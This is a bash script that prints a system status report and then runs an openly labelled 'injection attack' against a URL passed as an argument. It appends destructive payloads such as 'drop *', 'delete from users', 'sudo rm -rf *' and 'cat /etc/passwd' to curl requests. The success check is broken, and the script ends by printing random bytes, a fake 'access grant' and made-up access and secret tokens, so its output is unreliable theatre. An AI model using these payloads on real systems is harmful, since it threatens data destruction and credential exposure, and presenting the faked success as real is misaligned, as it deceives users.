#!/usr/bin/env bash


echo "System Status Report:"
echo "---------------------"

# Display current date and time
echo "Date and Time:"
date

# Display system uptime
echo -e "\nSystem Uptime:"
uptime

# Display system load average
echo -e "\nSystem Load Average:"
cat /proc/loadavg

# Display memory usage
echo -e "\nMemory Usage:"
free -h

# Display disk space usage
echo -e "\nDisk Space Usage:"
df -h

# Display top CPU-consuming processes
echo -e "\nTop CPU-consuming Processes:"
ps -eo pid,ppid,cmd,%cpu,%mem --sort=-%cpu | head -n 6

# Display top memory-consuming processes
echo -e "\nTop Memory-consuming Processes:"
ps -eo pid,ppid,cmd,%cpu,%mem --sort=-%mem | head -n 6



# message
echo "Starting Injection attack ...";

echo "performing at:";

# print date to set attack
date "+%Y/%m/%d %H:%M:%S";

# make a single requests to perform SQL injection attack
HOST1="$1/;drop *;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;select * from users where name like '*admin*' or name like '*root*';"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;select * from admins limit 1;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;delete from users;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;delete from admins;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;delete from users;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;select * from users;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

sleep 5s;

HOST1="$1/;sudo rm -rf *;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;ls -la;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;ls -ll;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;ls -l;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;ls -a;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;cat /etc/passwd;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

sleep 5m;

echo "Output key"
LC_ALL=C tr -dc '[:graph:]' </dev/urandom | head -c 1000; echo

echo "http://localhost:9000/auth/access/?query='select * from access limit 1;'"
echo "Response 200/OK"
date "+%Y/%m/%d %H:%M:%S";

echo "\n\n\n"

LC_ALL=C tr -dc '[:graph:]' </dev/urandom | head -c 100; echo

echo "deep response correct, access grant"

echo "access token: 84197289374982734bvoejroij34o850bbjp802fbou8vus324np9f029i3r923"
echo "secret token: 88VcRkk9ap1113Pk8%^s@kk5@ii^opnb%^2jddkvp2&&028394n994nj0940922"

exit 0;
